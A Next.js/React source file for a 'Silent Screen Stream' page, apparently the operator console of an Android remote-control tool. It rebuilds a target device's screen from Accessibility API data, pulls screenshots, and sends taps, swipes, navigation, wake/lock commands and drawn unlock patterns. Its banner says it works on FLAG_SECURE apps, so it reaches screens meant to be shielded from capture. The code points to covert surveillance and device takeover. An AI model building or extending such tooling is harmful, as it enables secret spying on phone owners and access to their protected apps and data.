'use client';

import { useEffect, useState, useCallback, useRef, Suspense } from 'react';
import { useSearchParams, useRouter } from 'next/navigation';
import Sidebar from '@/components/layout/Sidebar';
import Header from '@/components/layout/Header';
import { useAuthStore } from '@/lib/store';
import { connectSocket, getSocket } from '@/lib/socket';
import ScreenTreeRenderer, { ScreenTreeData, GestureEvent } from '@/components/stream/ScreenTreeRenderer';
import {
    Monitor,
    Play,
    Square,
    Wifi,
    WifiOff,
    ArrowLeft,
    Maximize2,
    Minimize2,
    MousePointer2,
    Info,
    AlertCircle,
    Eye,
    Smartphone,
    Camera,
    Image,
    Loader2,
    Home,
    LayoutGrid,
    ArrowDown,
    ArrowUp,
    ChevronLeft,
    ChevronRight,
    ChevronUp,
    ChevronDown,
    Pencil,
    Settings,
    X,
    Power,
    Lock,
} from 'lucide-react';
import Link from 'next/link';

export default function SilentStreamPage() {
    return (
        <Suspense fallback={null}>
            <SilentStreamContent />
        </Suspense>
    );
}

function SilentStreamContent() {
    const router = useRouter();
    const searchParams = useSearchParams();
    const deviceId = searchParams.get('id') as string;
    const { isAuthenticated, isHydrated } = useAuthStore();

    // Stream state
    const [isStreaming, setIsStreaming] = useState(false);
    const [isConnected, setIsConnected] = useState(false);
    const [screenData, setScreenData] = useState<ScreenTreeData | null>(null);
    const [error, setError] = useState<string | null>(null);
    const [fps, setFps] = useState(0);
    const [isFullscreen, setIsFullscreen] = useState(false);
    const [isRemoteEnabled, setIsRemoteEnabled] = useState(true);
    const [showDebug, setShowDebug] = useState(false);
    const [isDoodleMode, setIsDoodleMode] = useState(false);
    const [showOptionsPopover, setShowOptionsPopover] = useState(false);
    const [patternGridSize, setPatternGridSize] = useState(3);

    // Screenshot background state
    const [backgroundImage, setBackgroundImage] = useState<string | null>(null);
    const [isCapturingScreen, setIsCapturingScreen] = useState(false);
    const [showBackground, setShowBackground] = useState(true);
    const lastPackageRef = useRef<string>('');
    const lastNodeCountRef = useRef<number>(0);

    // Stats
    const [nodeCount, setNodeCount] = useState(0);
    const [lastUpdate, setLastUpdate] = useState<Date | null>(null);
    const frameCountRef = useRef(0);
    const lastFpsUpdateRef = useRef(Date.now());

    const containerRef = useRef<HTMLDivElement>(null);

    // Auth check
    useEffect(() => {
        if (isHydrated && !isAuthenticated) {
            router.push('/login');
        }
    }, [isHydrated, isAuthenticated, router]);

    // Count nodes recursively
    const countNodes = useCallback((node: any): number => {
        if (!node) return 0;
        let count = 1;
        if (node.children) {
            for (const child of node.children) {
                count += countNodes(child);
            }
        }
        return count;
    }, []);

    // Socket connection and event handlers
    useEffect(() => {
        if (!isAuthenticated || !deviceId) return;

        const socket = connectSocket();

        const handleConnect = () => {
            console.log('[SilentStream] Socket connected');
            setIsConnected(true);
            socket.emit('silent-screen:join', { deviceId });
            socket.emit('admin:join');
        };

        const handleDisconnect = () => {
            console.log('[SilentStream] Socket disconnected');
            setIsConnected(false);
        };

        const handleScreenUpdate = (data: ScreenTreeData) => {
            if (data.deviceId !== deviceId) return;

            const newNodeCount = countNodes(data.nodes);

            // Auto-clear background ONLY when package changes (switching apps)
            // This prevents constant clearing while just viewing content
            if (lastPackageRef.current && data.packageName !== lastPackageRef.current) {
                setBackgroundImage(null);
            }
            lastPackageRef.current = data.packageName;
            lastNodeCountRef.current = newNodeCount;

            setScreenData(data);
            setLastUpdate(new Date());
            setNodeCount(newNodeCount);
            setIsStreaming(true);
            setError(null);

            frameCountRef.current++;
            const now = Date.now();
            if (now - lastFpsUpdateRef.current >= 1000) {
                setFps(frameCountRef.current);
                frameCountRef.current = 0;
                lastFpsUpdateRef.current = now;
            }
        };

        const handleStarted = (data: { deviceId: string; screenWidth: number; screenHeight: number }) => {
            if (data.deviceId !== deviceId) return;
            console.log('[SilentStream] Started:', data);
            setIsStreaming(true);
            setError(null);
        };

        const handleStopped = (data: { deviceId: string }) => {
            if (data.deviceId !== deviceId) return;
            console.log('[SilentStream] Stopped');
            setIsStreaming(false);
        };

        const handleStatus = (data: { deviceId: string; isActive: boolean }) => {
            if (data.deviceId !== deviceId) return;
            setIsStreaming(data.isActive);
        };

        const handleScreenshot = (data: { deviceId: string; imageData: string }) => {
            if (data.deviceId !== deviceId) return;
            console.log('[SilentStream] Received screenshot for background');
            setBackgroundImage(`data:image/jpeg;base64,${data.imageData}`);
            setIsCapturingScreen(false);
        };

        socket.on('connect', handleConnect);
        socket.on('disconnect', handleDisconnect);
        socket.on('silent-screen:update', handleScreenUpdate);
        socket.on('silent-screen:started', handleStarted);
        socket.on('silent-screen:stopped', handleStopped);
        socket.on('silent-screen:status', handleStatus);
        socket.on('silent-screen:screenshot', handleScreenshot);

        if (socket.connected) {
            handleConnect();
        }

        return () => {
            socket.off('connect', handleConnect);
            socket.off('disconnect', handleDisconnect);
            socket.off('silent-screen:update', handleScreenUpdate);
            socket.off('silent-screen:started', handleStarted);
            socket.off('silent-screen:stopped', handleStopped);
            socket.off('silent-screen:status', handleStatus);
            socket.off('silent-screen:screenshot', handleScreenshot);
            socket.emit('silent-screen:leave', { deviceId });
        };
    }, [isAuthenticated, deviceId, countNodes]);

    useEffect(() => {
        const handleFullscreenChange = () => {
            setIsFullscreen(!!document.fullscreenElement);
        };
        document.addEventListener('fullscreenchange', handleFullscreenChange);
        return () => document.removeEventListener('fullscreenchange', handleFullscreenChange);
    }, []);

    const startStream = () => {
        const socket = getSocket();
        if (!socket) {
            setError('Not connected to server');
            return;
        }
        console.log('[SilentStream] Starting...');
        setError(null);
        socket.emit('silent-screen:start', { deviceId });
    };

    const stopStream = () => {
        const socket = getSocket();
        if (!socket) return;
        console.log('[SilentStream] Stopping...');
        socket.emit('silent-screen:stop', { deviceId });
        setIsStreaming(false);
        setScreenData(null);
    };

    const captureBackground = () => {
        const socket = getSocket();
        if (!socket) {
            setError('Not connected to server');
            return;
        }
        console.log('[SilentStream] Requesting screenshot for background...');
        setIsCapturingScreen(true);
        socket.emit('silent-screen:capture-background', { deviceId });

        setTimeout(() => {
            setIsCapturingScreen(false);
        }, 10000);
    };

    // Handle all gestures (new unified handler)
    const handleGesture = useCallback((gesture: GestureEvent) => {
        if (!isRemoteEnabled) return;
        const socket = getSocket();
        if (!socket) return;

        console.log(`[SilentStream] Gesture: ${gesture.type}`, gesture);

        // Emit gesture event to server
        socket.emit('silent-screen:gesture', {
            deviceId,
            type: gesture.type,
            startX: gesture.startX,
            startY: gesture.startY,
            endX: gesture.endX,
            endY: gesture.endY,
            direction: gesture.direction,
            duration: gesture.duration,
            // Include points for doodle gestures
            points: gesture.points
        });
    }, [deviceId, isRemoteEnabled]);

    // Send screen power commands (wake/lock)
    const sendScreenCommand = useCallback((command: 'wake_screen' | 'lock_screen') => {
        const socket = getSocket();
        if (!socket) return;

        console.log(`[SilentStream] Screen command: ${command}`);
        socket.emit('silent-screen:gesture', {
            deviceId,
            type: command
        });
    }, [deviceId]);

    // Legacy touch handler for backwards compatibility
    const handleTouch = useCallback((x: number, y: number, type: 'tap' | 'longpress') => {
        if (!isRemoteEnabled) return;
        const socket = getSocket();
        if (!socket) return;
        console.log(`[SilentStream] Touch ${type} at (${x.toFixed(3)}, ${y.toFixed(3)})`);
        socket.emit('silent-screen:touch', { deviceId, type, x, y });
    }, [deviceId, isRemoteEnabled]);

    // Send system gesture (back, home, recents, scroll, etc.)
    const sendSystemGesture = useCallback((gestureType: string) => {
        if (!isRemoteEnabled) return;
        const socket = getSocket();
        if (!socket) return;
        console.log(`[SilentStream] System gesture: ${gestureType}`);
        socket.emit('silent-screen:touch', { deviceId, type: gestureType });
    }, [deviceId, isRemoteEnabled]);

    const toggleFullscreen = () => {
        if (!document.fullscreenElement && containerRef.current) {
            containerRef.current.requestFullscreen();
        } else if (document.fullscreenElement) {
            document.exitFullscreen();
        }
    };

    if (!isHydrated || !isAuthenticated) return null;

    return (
        <div className="flex min-h-screen bg-[var(--background)]">
            <Sidebar />
            <main className="flex-1 lg:ml-72">
                <Header title="Silent Screen Stream" subtitle="Accessibility-based Screen Capture" />

                <div className="p-4 lg:p-8 max-w-7xl mx-auto animate-fade-in space-y-6">
                    {/* Header Actions */}
                    <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
                        <Link
                            href={`/devices/view/?id=${deviceId}`}
                            className="inline-flex items-center gap-2 text-[var(--muted)] hover:text-[var(--foreground)] transition-colors text-sm font-medium w-fit"
                        >
                            <ArrowLeft className="w-4 h-4" />
                            Back to Device
                        </Link>

                        <div className="flex items-center gap-3">
                            <div className={`flex items-center gap-2 px-4 py-2 rounded-xl border ${isConnected
                                ? 'bg-emerald-500/10 border-emerald-500/30 text-emerald-600'
                                : 'bg-red-500/10 border-red-500/30 text-red-500'
                                }`}>
                                {isConnected ? <Wifi className="w-4 h-4" /> : <WifiOff className="w-4 h-4" />}
                                <span className="text-xs font-bold uppercase tracking-widest">
                                    {isConnected ? 'Connected' : 'Disconnected'}
                                </span>
                            </div>

                            {isStreaming && (
                                <div className="flex items-center gap-2 px-4 py-2 rounded-xl bg-violet-500/10 border border-violet-500/30 text-violet-500">
                                    <div className="w-2 h-2 rounded-full bg-violet-500 animate-pulse" />
                                    <span className="text-xs font-bold uppercase tracking-widest">Streaming</span>
                                </div>
                            )}
                        </div>
                    </div>

                    {/* Info banner */}
                    <div className="p-4 rounded-2xl bg-gradient-to-r from-violet-500/10 to-purple-500/10 border border-violet-500/20">
                        <div className="flex items-start gap-3">
                            <Info className="w-5 h-5 text-violet-500 flex-shrink-0 mt-0.5" />
                            <div>
                                <h4 className="font-semibold text-sm mb-1">How Silent Screen Works</h4>
                                <p className="text-xs text-[var(--muted)] leading-relaxed">
                                    Uses Accessibility APIs to capture UI elements. Use &quot;Render Screen&quot; to capture a real screenshot
                                    as background for better visualization. Works on FLAG_SECURE apps.
                                </p>
                            </div>
                        </div>
                    </div>

                    <div className="grid grid-cols-1 lg:grid-cols-4 gap-6 lg:gap-8">
                        {/* Screen View */}
                        <div className="lg:col-span-3">
                            <div
                                ref={containerRef}
                                className="relative rounded-[2rem] border border-[var(--border)] overflow-hidden shadow-2xl bg-slate-900"
                                style={{ height: '80vh', minHeight: '600px' }}
                            >
                                <div className="absolute top-0 left-0 right-0 z-10 h-8 bg-gradient-to-b from-slate-800 to-transparent flex items-center justify-center">
                                    <div className="w-20 h-1 rounded-full bg-slate-700" />
                                </div>

                                <ScreenTreeRenderer
                                    data={screenData}
                                    onGesture={handleGesture}
                                    showDebugInfo={showDebug}
                                    backgroundImage={showBackground ? backgroundImage : null}
                                    className="h-full"
                                    doodleMode={isDoodleMode}
                                    patternGridSize={patternGridSize}
                                />

                                {error && (
                                    <div className="absolute inset-0 flex items-center justify-center bg-slate-900/90 z-20">
                                        <div className="text-center p-6">
                                            <AlertCircle className="w-12 h-12 text-red-500 mx-auto mb-4" />
                                            <p className="text-white font-semibold mb-2">Error</p>
                                            <p className="text-sm text-slate-400">{error}</p>
                                        </div>
                                    </div>
                                )}

                                {isStreaming && (
                                    <div className="absolute top-10 right-4 flex items-center gap-2 px-3 py-1.5 rounded-lg bg-black/50 text-white text-xs">
                                        <span>{fps} FPS</span>
                                        <span>•</span>
                                        <span>{nodeCount} nodes</span>
                                        {screenData && (
                                            <>
                                                <span>•</span>
                                                <span>{screenData.screenWidth}×{screenData.screenHeight}</span>
                                            </>
                                        )}
                                        {backgroundImage && (
                                            <>
                                                <span>•</span>
                                                <span className="text-emerald-400">BG</span>
                                            </>
                                        )}
                                    </div>
                                )}

                                <div className="absolute bottom-4 left-1/2 -translate-x-1/2 flex items-center gap-2">
                                    <button
                                        onClick={toggleFullscreen}
                                        className="p-3 rounded-xl bg-white/10 hover:bg-white/20 text-white transition-colors"
                                        title={isFullscreen ? 'Exit Fullscreen' : 'Fullscreen'}
                                    >
                                        {isFullscreen ? <Minimize2 className="w-5 h-5" /> : <Maximize2 className="w-5 h-5" />}
                                    </button>
                                </div>

                                {/* Floating Render Screen Button */}
                                <div className="absolute bottom-4 right-20 z-30">
                                    <button
                                        onClick={captureBackground}
                                        disabled={!isConnected || isCapturingScreen}
                                        className="p-3 rounded-xl bg-gradient-to-r from-emerald-600 to-teal-600 hover:opacity-90 transition-all shadow-lg text-white disabled:opacity-50"
                                        title="Render Screen"
                                    >
                                        {isCapturingScreen ? (
                                            <Loader2 className="w-5 h-5 animate-spin" />
                                        ) : (
                                            <Camera className="w-5 h-5" />
                                        )}
                                    </button>
                                </div>

                                {/* Floating Options Button */}
                                <div className="absolute bottom-4 right-4 z-30">
                                    <button
                                        onClick={() => setShowOptionsPopover(!showOptionsPopover)}
                                        className={`p-3 rounded-xl transition-all shadow-lg ${showOptionsPopover ? 'bg-violet-600 rotate-45' : 'bg-white/10 hover:bg-white/20'} text-white`}
                                        title="Options"
                                    >
                                        {showOptionsPopover ? <X className="w-5 h-5" /> : <Settings className="w-5 h-5" />}
                                    </button>

                                    {/* Options Popover */}
                                    {showOptionsPopover && (
                                        <div className="absolute bottom-14 right-0 w-56 p-4 rounded-2xl bg-slate-800/95 backdrop-blur-sm border border-slate-700 shadow-xl space-y-3 animate-fade-in">
                                            <label className="flex items-center justify-between cursor-pointer">
                                                <span className="text-sm text-white">Remote Touch</span>
                                                <button
                                                    onClick={() => setIsRemoteEnabled(!isRemoteEnabled)}
                                                    className={`w-10 h-5 rounded-full transition-colors ${isRemoteEnabled ? 'bg-violet-600' : 'bg-slate-600'}`}
                                                >
                                                    <div className={`w-4 h-4 rounded-full bg-white shadow transition-transform ${isRemoteEnabled ? 'translate-x-5' : 'translate-x-0.5'}`} />
                                                </button>
                                            </label>

                                            <label className="flex items-center justify-between cursor-pointer">
                                                <div className="flex items-center gap-2">
                                                    <Pencil className="w-3 h-3 text-cyan-400" />
                                                    <span className="text-sm text-white">Doodle</span>
                                                </div>
                                                <button
                                                    onClick={() => setIsDoodleMode(!isDoodleMode)}
                                                    disabled={!isRemoteEnabled}
                                                    className={`w-10 h-5 rounded-full transition-colors ${isDoodleMode ? 'bg-cyan-500' : 'bg-slate-600'} disabled:opacity-50`}
                                                >
                                                    <div className={`w-4 h-4 rounded-full bg-white shadow transition-transform ${isDoodleMode ? 'translate-x-5' : 'translate-x-0.5'}`} />
                                                </button>
                                            </label>

                                            {/* Grid size selector - only show when doodle is on */}
                                            {isDoodleMode && (
                                                <label className="flex items-center justify-between">
                                                    <span className="text-sm text-white">Grid</span>
                                                    <div className="flex items-center gap-1">
                                                        <button
                                                            onClick={() => setPatternGridSize(Math.max(3, patternGridSize - 1))}
                                                            className="w-6 h-6 rounded bg-slate-700 hover:bg-slate-600 text-white text-sm font-bold"
                                                        >
                                                            −
                                                        </button>
                                                        <span className="w-8 text-center text-sm text-white font-mono">{patternGridSize}×{patternGridSize}</span>
                                                        <button
                                                            onClick={() => setPatternGridSize(Math.min(9, patternGridSize + 1))}
                                                            className="w-6 h-6 rounded bg-slate-700 hover:bg-slate-600 text-white text-sm font-bold"
                                                        >
                                                            +
                                                        </button>
                                                    </div>
                                                </label>
                                            )}

                                            <label className="flex items-center justify-between cursor-pointer">
                                                <span className="text-sm text-white">Background</span>
                                                <button
                                                    onClick={() => setShowBackground(!showBackground)}
                                                    className={`w-10 h-5 rounded-full transition-colors ${showBackground ? 'bg-violet-600' : 'bg-slate-600'}`}
                                                >
                                                    <div className={`w-4 h-4 rounded-full bg-white shadow transition-transform ${showBackground ? 'translate-x-5' : 'translate-x-0.5'}`} />
                                                </button>
                                            </label>

                                            <label className="flex items-center justify-between cursor-pointer">
                                                <span className="text-sm text-white">Debug</span>
                                                <button
                                                    onClick={() => setShowDebug(!showDebug)}
                                                    className={`w-10 h-5 rounded-full transition-colors ${showDebug ? 'bg-violet-600' : 'bg-slate-600'}`}
                                                >
                                                    <div className={`w-4 h-4 rounded-full bg-white shadow transition-transform ${showDebug ? 'translate-x-5' : 'translate-x-0.5'}`} />
                                                </button>
                                            </label>

                                            {/* Screen power controls */}
                                            <div className="flex gap-2 pt-2 border-t border-slate-700">
                                                <button
                                                    onClick={() => sendScreenCommand('wake_screen')}
                                                    className="flex-1 py-2 px-3 rounded-lg bg-emerald-600 hover:bg-emerald-500 text-white text-xs font-medium flex items-center justify-center gap-1.5 transition-colors"
                                                >
                                                    <Power className="w-3.5 h-3.5" />
                                                    Wake
                                                </button>
                                                <button
                                                    onClick={() => sendScreenCommand('lock_screen')}
                                                    className="flex-1 py-2 px-3 rounded-lg bg-orange-600 hover:bg-orange-500 text-white text-xs font-medium flex items-center justify-center gap-1.5 transition-colors"
                                                >
                                                    <Lock className="w-3.5 h-3.5" />
                                                    Lock
                                                </button>
                                            </div>
                                        </div>
                                    )}
                                </div>
                            </div>
                        </div>

                        {/* Controls Panel */}
                        <div className="lg:col-span-1 space-y-4">
                            <div className="p-6 rounded-2xl border border-[var(--border)] bg-[var(--card)]">
                                <h3 className="font-bold text-sm mb-4 flex items-center gap-2">
                                    <Monitor className="w-4 h-4" />
                                    Stream Controls
                                </h3>

                                <div className="space-y-3">
                                    {!isStreaming ? (
                                        <button
                                            onClick={startStream}
                                            disabled={!isConnected}
                                            className="w-full py-4 rounded-xl bg-gradient-to-r from-violet-600 to-purple-600 text-white font-semibold flex items-center justify-center gap-2 hover:opacity-90 transition-opacity disabled:opacity-50 disabled:cursor-not-allowed"
                                        >
                                            <Play className="w-5 h-5" />
                                            Start Capture
                                        </button>
                                    ) : (
                                        <button
                                            onClick={stopStream}
                                            className="w-full py-4 rounded-xl bg-red-600 text-white font-semibold flex items-center justify-center gap-2 hover:bg-red-700 transition-colors"
                                        >
                                            <Square className="w-5 h-5" />
                                            Stop Capture
                                        </button>
                                    )}

                                    <button
                                        onClick={captureBackground}
                                        disabled={!isConnected || isCapturingScreen}
                                        className="w-full py-3 rounded-xl bg-gradient-to-r from-emerald-600 to-teal-600 text-white font-semibold flex items-center justify-center gap-2 hover:opacity-90 transition-opacity disabled:opacity-50 disabled:cursor-not-allowed"
                                    >
                                        {isCapturingScreen ? (
                                            <>
                                                <Loader2 className="w-4 h-4 animate-spin" />
                                                Capturing...
                                            </>
                                        ) : (
                                            <>
                                                <Camera className="w-4 h-4" />
                                                Render Screen
                                            </>
                                        )}
                                    </button>
                                    <p className="text-[9px] text-center text-[var(--muted)]">
                                        Captures real screenshot as background
                                    </p>
                                </div>
                            </div>

                            <div className="p-6 rounded-2xl border border-[var(--border)] bg-[var(--card)]">
                                <h3 className="font-bold text-sm mb-4 flex items-center gap-2">
                                    <MousePointer2 className="w-4 h-4" />
                                    Options
                                </h3>

                                <div className="space-y-4">
                                    <label className="flex items-center justify-between cursor-pointer">
                                        <span className="text-sm">Remote Touch</span>
                                        <button
                                            onClick={() => setIsRemoteEnabled(!isRemoteEnabled)}
                                            className={`w-12 h-6 rounded-full transition-colors ${isRemoteEnabled ? 'bg-violet-600' : 'bg-slate-600'}`}
                                        >
                                            <div className={`w-5 h-5 rounded-full bg-white shadow transition-transform ${isRemoteEnabled ? 'translate-x-6' : 'translate-x-0.5'}`} />
                                        </button>
                                    </label>

                                    <label className="flex items-center justify-between cursor-pointer">
                                        <div className="flex items-center gap-2">
                                            <Pencil className="w-3 h-3 text-cyan-400" />
                                            <span className="text-sm">Doodle Mode</span>
                                        </div>
                                        <button
                                            onClick={() => setIsDoodleMode(!isDoodleMode)}
                                            disabled={!isRemoteEnabled}
                                            className={`w-12 h-6 rounded-full transition-colors ${isDoodleMode ? 'bg-cyan-500' : 'bg-slate-600'} disabled:opacity-50`}
                                        >
                                            <div className={`w-5 h-5 rounded-full bg-white shadow transition-transform ${isDoodleMode ? 'translate-x-6' : 'translate-x-0.5'}`} />
                                        </button>
                                    </label>

                                    <label className="flex items-center justify-between cursor-pointer">
                                        <div className="flex items-center gap-2">
                                            <Image className="w-3 h-3 text-[var(--muted)]" />
                                            <span className="text-sm">Show Background</span>
                                        </div>
                                        <button
                                            onClick={() => setShowBackground(!showBackground)}
                                            className={`w-12 h-6 rounded-full transition-colors ${showBackground ? 'bg-violet-600' : 'bg-slate-600'}`}
                                        >
                                            <div className={`w-5 h-5 rounded-full bg-white shadow transition-transform ${showBackground ? 'translate-x-6' : 'translate-x-0.5'}`} />
                                        </button>
                                    </label>

                                    <label className="flex items-center justify-between cursor-pointer">
                                        <span className="text-sm">Debug Info</span>
                                        <button
                                            onClick={() => setShowDebug(!showDebug)}
                                            className={`w-12 h-6 rounded-full transition-colors ${showDebug ? 'bg-violet-600' : 'bg-slate-600'}`}
                                        >
                                            <div className={`w-5 h-5 rounded-full bg-white shadow transition-transform ${showDebug ? 'translate-x-6' : 'translate-x-0.5'}`} />
                                        </button>
                                    </label>
                                </div>
                            </div>

                            {/* Navigation Controls */}
                            <div className="p-6 rounded-2xl border border-[var(--border)] bg-[var(--card)]">
                                <h3 className="font-bold text-sm mb-4 flex items-center gap-2">
                                    <LayoutGrid className="w-4 h-4" />
                                    Navigation
                                </h3>

                                {/* Main Nav Buttons */}
                                <div className="grid grid-cols-3 gap-2 mb-4">
                                    <button
                                        onClick={() => sendSystemGesture('back')}
                                        disabled={!isRemoteEnabled}
                                        className="p-3 rounded-xl bg-slate-700 hover:bg-slate-600 transition-colors disabled:opacity-50 disabled:cursor-not-allowed flex flex-col items-center gap-1"
                                        title="Back"
                                    >
                                        <ChevronLeft className="w-5 h-5" />
                                        <span className="text-[10px]">Back</span>
                                    </button>
                                    <button
                                        onClick={() => sendSystemGesture('home')}
                                        disabled={!isRemoteEnabled}
                                        className="p-3 rounded-xl bg-slate-700 hover:bg-slate-600 transition-colors disabled:opacity-50 disabled:cursor-not-allowed flex flex-col items-center gap-1"
                                        title="Home"
                                    >
                                        <Home className="w-5 h-5" />
                                        <span className="text-[10px]">Home</span>
                                    </button>
                                    <button
                                        onClick={() => sendSystemGesture('recents')}
                                        disabled={!isRemoteEnabled}
                                        className="p-3 rounded-xl bg-slate-700 hover:bg-slate-600 transition-colors disabled:opacity-50 disabled:cursor-not-allowed flex flex-col items-center gap-1"
                                        title="Recents"
                                    >
                                        <LayoutGrid className="w-5 h-5" />
                                        <span className="text-[10px]">Recents</span>
                                    </button>
                                </div>

                                {/* Scroll Controls */}
                                <div className="grid grid-cols-3 gap-2">
                                    <div></div>
                                    <button
                                        onClick={() => sendSystemGesture('scroll_up')}
                                        disabled={!isRemoteEnabled}
                                        className="p-2 rounded-lg bg-slate-800 hover:bg-slate-700 transition-colors disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center"
                                        title="Scroll Up"
                                    >
                                        <ChevronUp className="w-5 h-5" />
                                    </button>
                                    <div></div>
                                    <button
                                        onClick={() => sendSystemGesture('scroll_left')}
                                        disabled={!isRemoteEnabled}
                                        className="p-2 rounded-lg bg-slate-800 hover:bg-slate-700 transition-colors disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center"
                                        title="Scroll Left"
                                    >
                                        <ChevronLeft className="w-5 h-5" />
                                    </button>
                                    <div className="p-2 rounded-lg bg-slate-900 flex items-center justify-center">
                                        <span className="text-[10px] text-[var(--muted)]">Scroll</span>
                                    </div>
                                    <button
                                        onClick={() => sendSystemGesture('scroll_right')}
                                        disabled={!isRemoteEnabled}
                                        className="p-2 rounded-lg bg-slate-800 hover:bg-slate-700 transition-colors disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center"
                                        title="Scroll Right"
                                    >
                                        <ChevronRight className="w-5 h-5" />
                                    </button>
                                    <div></div>
                                    <button
                                        onClick={() => sendSystemGesture('scroll_down')}
                                        disabled={!isRemoteEnabled}
                                        className="p-2 rounded-lg bg-slate-800 hover:bg-slate-700 transition-colors disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center"
                                        title="Scroll Down"
                                    >
                                        <ChevronDown className="w-5 h-5" />
                                    </button>
                                    <div></div>
                                </div>

                                {/* Extra Controls */}
                                <div className="grid grid-cols-2 gap-2 mt-4">
                                    <button
                                        onClick={() => sendSystemGesture('notifications')}
                                        disabled={!isRemoteEnabled}
                                        className="p-2 rounded-lg bg-slate-800 hover:bg-slate-700 transition-colors disabled:opacity-50 disabled:cursor-not-allowed text-xs"
                                        title="Open Notifications"
                                    >
                                        Notifications
                                    </button>
                                    <button
                                        onClick={() => sendSystemGesture('quick_settings')}
                                        disabled={!isRemoteEnabled}
                                        className="p-2 rounded-lg bg-slate-800 hover:bg-slate-700 transition-colors disabled:opacity-50 disabled:cursor-not-allowed text-xs"
                                        title="Quick Settings"
                                    >
                                        Quick Settings
                                    </button>
                                </div>

                                <p className="text-[9px] text-center text-[var(--muted)] mt-3">
                                    Enable Remote Touch to use controls
                                </p>
                            </div>

                            <div className="p-6 rounded-2xl border border-[var(--border)] bg-[var(--card)]">
                                <h3 className="font-bold text-sm mb-4 flex items-center gap-2">
                                    <Smartphone className="w-4 h-4" />
                                    Stats
                                </h3>

                                <div className="space-y-3 text-sm">
                                    <div className="flex justify-between">
                                        <span className="text-[var(--muted)]">Status</span>
                                        <span className={isStreaming ? 'text-emerald-500' : 'text-slate-500'}>
                                            {isStreaming ? 'Active' : 'Inactive'}
                                        </span>
                                    </div>
                                    <div className="flex justify-between">
                                        <span className="text-[var(--muted)]">Frame Rate</span>
                                        <span>{fps} FPS</span>
                                    </div>
                                    <div className="flex justify-between">
                                        <span className="text-[var(--muted)]">UI Elements</span>
                                        <span>{nodeCount}</span>
                                    </div>
                                    <div className="flex justify-between">
                                        <span className="text-[var(--muted)]">Background</span>
                                        <span className={backgroundImage ? 'text-emerald-500' : 'text-slate-500'}>
                                            {backgroundImage ? 'Loaded' : 'None'}
                                        </span>
                                    </div>
                                    {screenData && (
                                        <>
                                            <div className="flex justify-between">
                                                <span className="text-[var(--muted)]">Resolution</span>
                                                <span>{screenData.screenWidth}×{screenData.screenHeight}</span>
                                            </div>
                                            <div className="flex justify-between">
                                                <span className="text-[var(--muted)]">Package</span>
                                                <span className="text-xs truncate max-w-[120px]" title={screenData.packageName}>
                                                    {screenData.packageName.split('.').pop()}
                                                </span>
                                            </div>
                                        </>
                                    )}
                                    {lastUpdate && (
                                        <div className="flex justify-between">
                                            <span className="text-[var(--muted)]">Last Update</span>
                                            <span className="text-xs">{lastUpdate.toLocaleTimeString()}</span>
                                        </div>
                                    )}
                                </div>
                            </div>

                            <Link
                                href={`/devices/view/stream?id=${deviceId}`}
                                className="block p-4 rounded-2xl border border-[var(--border)] bg-[var(--card)] hover:bg-[var(--card-hover)] transition-colors"
                            >
                                <div className="flex items-center gap-3">
                                    <div className="w-10 h-10 rounded-xl bg-gradient-to-br from-blue-500 to-cyan-500 flex items-center justify-center">
                                        <Eye className="w-5 h-5 text-white" />
                                    </div>
                                    <div>
                                        <p className="font-semibold text-sm">Regular Stream</p>
                                        <p className="text-xs text-[var(--muted)]">WebRTC camera/screen</p>
                                    </div>
                                </div>
                            </Link>
                        </div>
                    </div>
                </div>
            </main>
        </div>
    );
}
